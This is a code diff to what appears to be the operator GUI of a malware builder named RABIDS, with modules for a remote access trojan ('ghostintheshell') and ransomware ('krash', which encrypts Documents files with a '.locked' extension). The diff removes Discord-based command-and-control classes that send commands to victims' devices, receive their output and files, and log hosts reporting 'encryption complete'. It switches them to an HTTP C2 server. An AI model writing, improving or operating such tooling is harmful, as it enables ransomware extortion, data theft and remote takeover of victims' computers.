@@ -15,8 +15,6 @@ from PyQt5.QtWidgets import (
 import json
 from PyQt5.QtGui import QFont, QPixmap, QMovie, QIcon
 from PyQt5.QtCore import Qt, QThread, pyqtSignal, QObject, QTimer, QUrl
-import discord
-import asyncio
 
 ASCII = r"""                                                                                                                                                                                                                         
 """
@@ -78,8 +76,7 @@ MODULE_OPTIONS = {
         'dumpsterFile': '$HOME/dumpster.dat'
     },
     'module/ghostintheshell': {
-        'discordToken': 'YOUR_DISCORD_BOT_TOKEN',
-        'creatorId': 'YOUR_DISCORD_USER_ID'
+        'serverUrl': 'http://localhost:8080'
     },
     'module/krash': {
         'key': '0123456789abcdef0123456789abcdef',
@@ -87,8 +84,7 @@ MODULE_OPTIONS = {
         'extension': '.locked',
         'targetDir': '$HOME/Documents',
         'htmlContent': DEFAULT_KRASH_HTML,
-        'discordToken': 'YOUR_DISCORD_BOT_TOKEN',
-        'creatorId': 'YOUR_DISCORD_USER_ID',
+        'serverUrl': 'http://localhost:8080'
     },
     'module/poof': {
         'targetDir': '$HOME/Documents'
@@ -102,8 +98,7 @@ MODULE_OPTIONS = {
         'embedFiles': 'path/to/driver.sys,path/to/cert.pem'
     },
     'module/bankruptsys': {
-        'discordToken': 'YOUR_DISCORD_BOT_TOKEN',
-        'creatorId': 'YOUR_DISCORD_USER_ID',
+        'serverUrl': 'http://localhost:8080'
     },
     'module/winkrashv2': {
         'key': 'secret',
@@ -112,145 +107,6 @@ MODULE_OPTIONS = {
 }
 
 
-class DiscordListener(QObject):
-    device_status_update = pyqtSignal(str, str)
-
-    def __init__(self, token, creator_id=None):
-        super().__init__()
-        self.token = token
-        self.creator_id = creator_id
-        intents = discord.Intents.default()
-        intents.message_content = True
-        self.client = discord.Client(intents=intents)
-
-        @self.client.event
-        async def on_ready():
-            print(f'GUI Listener logged in as {self.client.user}')
-            self.device_status_update.emit("SYSTEM", f"Connected to Discord as {self.client.user}")
-            
-            creator_found = False
-            if self.creator_id:
-                try:
-                    creator = await self.client.fetch_user(int(self.creator_id))
-                    if not creator:
-                        self.device_status_update.emit("ERROR", f"Could not find creator with ID: {self.creator_id}")
-                        return
-                    self.device_status_update.emit("SYSTEM", f"Fetching DM history with {creator.name}...")
-                    await self.fetch_history(creator)
-                    creator_found = True
-                except (ValueError, discord.NotFound):
-                    self.device_status_update.emit("ERROR", f"Could not find creator with ID: {self.creator_id}")
-                except discord.Forbidden:
-                    self.device_status_update.emit("ERROR", "Bot does not have permission to fetch DM history.")
-            
-            if not creator_found:
-                self.device_status_update.emit("SYSTEM", "No Creator ID provided or user not found. Only listening for new DMs.")
-
-        @self.client.event
-        async def on_message(message):
-            is_dm = isinstance(message.channel, discord.DMChannel)
-            is_from_creator = self.creator_id and str(message.author.id) == self.creator_id
-
-            if is_dm and is_from_creator:
-                self.process_encryption_message(message.content)
-
-    async def fetch_history(self, user):
-        """Fetches and processes historical messages from a user."""
-        async for msg in user.history(limit=100):
-            if ':' in msg.content and 'encryption complete' in msg.content.lower():
-                self.process_encryption_message(msg.content)
-
-    def process_encryption_message(self, content):
-        if ':' in content and 'encryption complete' in content.lower():
-            hostname = content.split(':', 1)[0].strip()
-            self.device_status_update.emit(hostname, "Encrypted")
-
-    async def run_client(self):
-        try:
-            await self.client.start(self.token)
-        except discord.LoginFailure:
-            self.device_status_update.emit("ERROR", "Discord login failed. Check the token.")
-
-    async def stop_client(self):
-        if self.client:
-            await self.client.close()
-
-class DiscordC2Client(QObject):
-    """Handles Discord connection and communication for the C2 tab."""
-    log_message = pyqtSignal(str, str)
-    connection_status = pyqtSignal(bool)
-
-    def __init__(self, token, target_user_id):
-        super().__init__()
-        self.token = token
-        self.target_user_id = target_user_id
-        self.target_user = None
-        intents = discord.Intents.default()
-        intents.messages = True
-        intents.dm_messages = True
-        intents.message_content = True
-        self.client = discord.Client(intents=intents)
-
-        @self.client.event
-        async def on_ready():
-            self.log_message.emit(f"C2 client logged in as {self.client.user}", "success")
-            try:
-                self.target_user = await self.client.fetch_user(int(self.target_user_id))
-                self.log_message.emit(f"Connected to target user '{self.target_user.name}'.", "success")
-                self.connection_status.emit(True)
-            except (ValueError, discord.NotFound):
-                self.log_message.emit(f"Could not find target user with ID: {self.target_user_id}", "error")
-                await self.stop_client()
-            except discord.Forbidden:
-                self.log_message.emit("Bot does not have permission to fetch user.", "error")
-                await self.stop_client()
-
-        @self.client.event
-        async def on_message(message):
-            is_dm = isinstance(message.channel, discord.DMChannel)
-
-            if is_dm:
-                content = message.content.strip()
-                if content:
-                    if content.startswith("```") and content.endswith("```"):
-                        content = re.sub(r"```(plaintext\n)?|```", "", content).strip()
-                    self.log_message.emit(content, "c2_recv")
-                if message.attachments:
-                    for attachment in message.attachments:
-                        self.log_message.emit(f"Received file: <a href='{attachment.url}'>{attachment.filename}</a>", "c2_recv")
-
-    async def send_dm(self, content):
-        if self.target_user:
-            try:
-                sent_content = content.strip()
-                await self.target_user.send(sent_content)
-                self.log_message.emit(sent_content, "c2_sent")
-                return True
-            except discord.Forbidden:
-                self.log_message.emit("Cannot send DMs to this user. Check permissions.", "error")
-                return False
-            except Exception as e:
-                self.log_message.emit(f"Failed to send DM: {str(e)}", "error")
-                return False
-        else:
-            self.log_message.emit("Not connected to a target user.", "error")
-            return False
-
-    async def run_client(self):
-        try:
-            await self.client.start(self.token)
-        except discord.LoginFailure:
-            self.log_message.emit("C2 client login failed. Check the token.", "error")
-            self.connection_status.emit(False)
-        except Exception as e:
-            self.log_message.emit(f"C2 client error: {str(e)}", "error")
-            self.connection_status.emit(False)
-
-    async def stop_client(self):
-        if self.client and self.client.is_ready():
-            await self.client.close()
-            self.log_message.emit("C2 client disconnected.", "system")
-        self.connection_status.emit(False)
 
 class BuildThread(QThread):
     log_signal = pyqtSignal(str, str)
@@ -290,71 +146,6 @@ class BuildThread(QThread):
             self.log_signal.emit(f"An unexpected error occurred during build: {e}", "error")
             self.finished_signal.emit(-1)
 
-class DiscordListenerThread(QThread):
-    device_status_update = pyqtSignal(str, str)
-
-    def __init__(self, token, creator_id=None):
-        super().__init__()
-        self.token = token
-        self.creator_id = creator_id
-        self.listener = None
-        self.loop = None
-
-    def run(self):
-        self.loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(self.loop)
-        listener = DiscordListener(self.token, self.creator_id)
-        listener.device_status_update.connect(self.device_status_update)
-        self.listener = listener
-        self.loop.run_until_complete(listener.run_client())
-
-    def refresh_messages(self):
-        if self.loop and self.listener and self.listener.client and self.listener.client.is_ready():
-            if self.creator_id:
-                async def do_refresh():
-                    try:
-                        creator = await self.listener.client.fetch_user(int(self.creator_id))
-                        if creator:
-                            self.device_status_update.emit("SYSTEM", f"Refreshing DM history with {creator.name}...")
-                            await self.listener.fetch_history(creator)
-                            self.device_status_update.emit("SYSTEM", "Refresh complete.")
-                    except Exception as e:
-                        self.device_status_update.emit("ERROR", f"Failed to refresh: {e}")
-                
-                self.loop.call_soon_threadsafe(self.loop.create_task, do_refresh())
-
-    def stop(self):
-        if self.loop and self.listener:
-            self.loop.call_soon_threadsafe(self.loop.create_task, self.listener.stop_client())
-            self.device_status_update.emit("SYSTEM", "Disconnected from Discord.")
-
-class C2Thread(QThread):
-    """Runs the Discord C2 client in a separate thread."""
-    log_message = pyqtSignal(str, str)
-    connection_status = pyqtSignal(bool)
-
-    def __init__(self, token, target_user_id):
-        super().__init__()
-        self.token = token
-        self.target_user_id = target_user_id
-        self.c2_client = None
-        self.loop = None
-
-    def run(self):
-        self.loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(self.loop)
-        self.c2_client = DiscordC2Client(self.token, self.target_user_id)
-        self.c2_client.log_message.connect(self.log_message)
-        self.c2_client.connection_status.connect(self.connection_status)
-        self.loop.run_until_complete(self.c2_client.run_client())
-
-    def send_message(self, content):
-        if self.loop and self.c2_client and self.c2_client.client.is_ready():
-            asyncio.run_coroutine_threadsafe(self.c2_client.send_dm(content), self.loop)
-
-    def stop(self):
-        if self.loop and self.c2_client:
-            asyncio.run_coroutine_threadsafe(self.c2_client.stop_client(), self.loop)
 
 class DependencyInstallerThread(QThread):
     log_signal = pyqtSignal(str, str)
@@ -434,8 +225,6 @@ class RABIDSGUI(QMainWindow):
         self.selected_modules = []
         self.loading_movie = None
         self.build_thread = None
-        self.discord_thread = None
-        self.c2_thread = None
         self.installer_thread = None
         self.option_inputs = {}
         self.current_option_values = {}
@@ -874,7 +663,7 @@ class RABIDSGUI(QMainWindow):
         left_column_layout.addLayout(devices_header_layout)
 
         live_devices_desc_label = QLabel("This panel displays a live list of devices successfully encrypted by the 'krash' module.\n"
-                                         "Devices appear here after reporting back via the Discord listener.")
+                                         "Devices report back via HTTP server.")
         live_devices_desc_label.setFont(subtitle_font)
         live_devices_desc_label.setStyleSheet("color: #FFF100;")
         live_devices_desc_label.setWordWrap(True)
@@ -925,7 +714,7 @@ class RABIDSGUI(QMainWindow):
         c2_header_layout.addWidget(c2_title)
         c2_left_layout.addLayout(c2_header_layout)
 
-        c2_desc = QLabel("Connect to RAT to send commands to and receive output from the 'ghostintheshell' payload. \nControl victim's device remotely")
+        c2_desc = QLabel("Connect to RAT to send commands to and receive output from the 'ghostintheshell' payload.\nCommunication via HTTP Server\nControl victim's device remotely")
         c2_desc.setFont(subtitle_font)
         c2_desc.setStyleSheet("color: #00A9FD;")
         c2_desc.setWordWrap(True)
@@ -986,17 +775,11 @@ class RABIDSGUI(QMainWindow):
             setting_layout.addSpacing(10)
             return setting_layout
 
-        listener_token_label = QLabel("Listener Bot Token")
-        self.settings_discord_token_edit = QLineEdit()
-        listener_token_desc = "The authentication token for the Discord bot. Used by the KRASH listener and C2 functionality."
-        listener_layout = create_setting_layout(listener_token_label.text(), self.settings_discord_token_edit, listener_token_desc)
-        settings_layout.addLayout(listener_layout)
-
-        listener_creator_id_label = QLabel("Discord User ID")
-        self.settings_listener_creator_id_edit = QLineEdit()
-        listener_creator_id_desc = "Your Discord user ID. The GUI listener bot will only accept commands and DMs from this user."
-        listener_creator_id_layout = create_setting_layout(listener_creator_id_label.text(), self.settings_listener_creator_id_edit, listener_creator_id_desc)
-        settings_layout.addLayout(listener_creator_id_layout)
+        server_url_label = QLabel("HTTP Server URL")
+        self.settings_server_url_edit = QLineEdit()
+        server_url_desc = "The URL of your HTTP C2 server. Example: http://your-server.com:8080"
+        server_url_layout = create_setting_layout(server_url_label.text(), self.settings_server_url_edit, server_url_desc)
+        settings_layout.addLayout(server_url_layout)
 
         settings_layout.addSpacing(20)
 
@@ -1825,8 +1608,7 @@ class RABIDSGUI(QMainWindow):
                 "output_dir": self.restore_output_dir_edit.text()
             },
             "listener": {
-                "token": self.settings_discord_token_edit.text(),
-                "creator_id": self.settings_listener_creator_id_edit.text()
+                "server_url": self.settings_server_url_edit.text()
             }
         }
         try:
@@ -1866,8 +1648,7 @@ class RABIDSGUI(QMainWindow):
             self.restore_output_dir_edit.setText(gc_cfg.get("output_dir", ""))
 
             listener_cfg = config.get("listener", {})
-            self.settings_discord_token_edit.setText(listener_cfg.get("token", ""))
-            self.settings_listener_creator_id_edit.setText(listener_cfg.get("creator_id", ""))
+            self.settings_server_url_edit.setText(listener_cfg.get("server_url", "http://localhost:8080"))
 
         except (json.JSONDecodeError, KeyError) as e:
             print(f"Error loading settings from config file: {e}")
